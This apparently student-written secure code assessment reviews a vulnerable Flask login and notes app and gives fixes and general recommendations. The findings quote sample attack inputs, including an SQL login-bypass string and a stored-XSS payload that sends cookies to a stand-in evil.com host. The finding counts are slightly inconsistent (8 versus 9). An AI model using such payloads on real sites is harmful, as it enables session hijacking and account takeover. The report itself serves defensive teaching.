# Secure Code Assessment Report
**Project:** CODSOFT Cyber Security Internship — Task 3
**Target Application:** `vulnerable_app_BEFORE.py` — Flask user login & notes manager (Python)
**Method:** Manual source code review + static analysis tool (**Bandit v1.9.4**)
**Date:** 2026-09-15

---

## 1. Executive Summary

The target application is a small Flask web app with user registration, login, and a
notes feature backed by SQLite. A combined manual review and automated Bandit scan
identified **8 findings** across **3 High**, **5 Medium**, and **1 Low** severity issues,
covering SQL Injection, broken cryptography, hardcoded secrets, Cross-Site Scripting
(XSS), and insecure deployment configuration. All findings have been remediated in
`secure_app_AFTER.py`, which was re-scanned with Bandit and returned **0 issues**.

---

## 2. Tooling

| Tool | Purpose |
|---|---|
| Bandit 1.9.4 | Automated static analysis (SAST) for Python |
| Manual code review | Business-logic flaws automated tools miss (e.g. missing rate limiting) |

---

## 3. Findings

### 3.1 SQL Injection (CWE-89) — **High Risk**
- **Location:** `register()`, `login()`, `notes()`
- **Issue:** User input (`username`, `password`, `content`) is concatenated directly
  into SQL strings using f-strings, e.g.:
  ```python
  conn.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{hashed}'")
  ```
- **Impact:** An attacker submitting `username = admin' --` could bypass authentication
  entirely, or extract/alter arbitrary database records.
- **Fix:** Use parameterized queries everywhere:
  ```python
  conn.execute("SELECT * FROM users WHERE username = ?", (username,))
  ```

### 3.2 Weak Password Hashing — MD5 (CWE-327) — **High Risk**
- **Location:** `register()`, `login()`
- **Issue:** Passwords hashed with `hashlib.md5()`, which is fast and has no salt —
  trivially crackable with rainbow tables or GPU brute force.
- **Fix:** Use `bcrypt` (adaptive cost, automatic per-user salt):
  ```python
  bcrypt.hashpw(password.encode(), bcrypt.gensalt())
  ```

### 3.3 Insecure Deployment Configuration (CWE-94 / CWE-605) — **High Risk**
- **Location:** `app.run(debug=True, host="0.0.0.0")`
- **Issue:** `debug=True` exposes the interactive Werkzeug debugger, which allows
  **arbitrary remote code execution** if reachable. Binding to `0.0.0.0` exposes the
  app on every network interface.
- **Fix:** `app.run(debug=False, host="127.0.0.1")` for local/dev use; in real
  production, run behind a WSGI server (gunicorn/uWSGI) with debug permanently off.

### 3.4 Hardcoded Secret Key (CWE-259) — **Low/Medium Risk**
- **Location:** `app.secret_key = "12345"`
- **Issue:** Predictable, hardcoded Flask session secret lets an attacker forge valid
  session cookies.
- **Fix:** Load from an environment variable or generate randomly:
  ```python
  app.secret_key = os.environ.get("APP_SECRET_KEY", os.urandom(32))
  ```

### 3.5 Stored Cross-Site Scripting — XSS (CWE-79) — **Medium Risk**
- **Location:** `notes()` — manually builds HTML with `f"<p>{r[0]}</p>"`
- **Issue:** Note content is inserted into the page with no escaping. A user submitting
  `<script>fetch('//evil.com/steal?c='+document.cookie)</script>` as a note would have
  that script executed for every viewer of the page.
- **Fix:** Use Jinja2 templates (`render_template_string`), which auto-escape variables
  by default.

### 3.6 Sensitive Information Disclosure (CWE-200) — **Medium Risk**
- **Location:** `/admin/debug` endpoint
- **Issue:** Publicly reachable endpoint with no authentication returns the app's
  secret key and internal DB path.
- **Fix:** Remove debug endpoints entirely before shipping, or gate behind
  authentication + IP allowlisting.

### 3.7 No Brute-Force Protection (CWE-307) — **Medium Risk**
- **Location:** `login()`
- **Issue:** No limit on repeated failed login attempts — enables credential-stuffing
  and brute-force attacks.
- **Fix:** Track failed attempts per username and temporarily lock the account after a
  threshold (implemented as a simple in-memory counter in the fixed version; use
  Redis/DB-backed counters or a library like `Flask-Limiter` in production).

### 3.8 Missing Input Validation — **Low Risk**
- **Location:** `register()`
- **Issue:** No minimum password length or empty-username checks.
- **Fix:** Enforce minimum password length (8+ chars) and reject empty usernames
  server-side.

---

## 4. Bandit Scan Summary

| File | High | Medium | Low | Total |
|---|---|---|---|---|
| `vulnerable_app_BEFORE.py` | 3 | 5 | 1 | **9** |
| `secure_app_AFTER.py` | 0 | 0 | 0 | **0** |

---

## 5. Secure Coding Recommendations (General)

1. **Never build SQL with string interpolation** — always use parameterized
   queries or an ORM (SQLAlchemy).
2. **Use modern password hashing** (`bcrypt`, `argon2`) — never MD5/SHA1 for
   credentials.
3. **Keep secrets out of source code** — load from environment variables or a
   secrets manager.
4. **Auto-escape all user-controlled output** — rely on templating engines rather
   than manual string concatenation for HTML.
5. **Disable debug mode and remove debug/diagnostic endpoints** before any
   deployment beyond local development.
6. **Rate-limit authentication endpoints** to slow down brute-force and
   credential-stuffing attacks.
7. **Validate and sanitize all user input** server-side, even if client-side
   validation also exists.
8. **Run static analysis (Bandit, Semgrep) in CI** so these classes of bugs are
   caught automatically on every commit.

---

## 6. Conclusion

The initial version of the application contained multiple critical, well-known
vulnerability classes (SQL Injection, weak hashing, XSS, insecure debug config)
that are common in real-world codebases. After applying parameterized queries,
bcrypt hashing, template auto-escaping, environment-based secrets, and basic
rate limiting, a re-scan confirmed **zero remaining Bandit findings**. This
demonstrates the value of combining automated SAST tooling with manual review
during a secure code assessment.
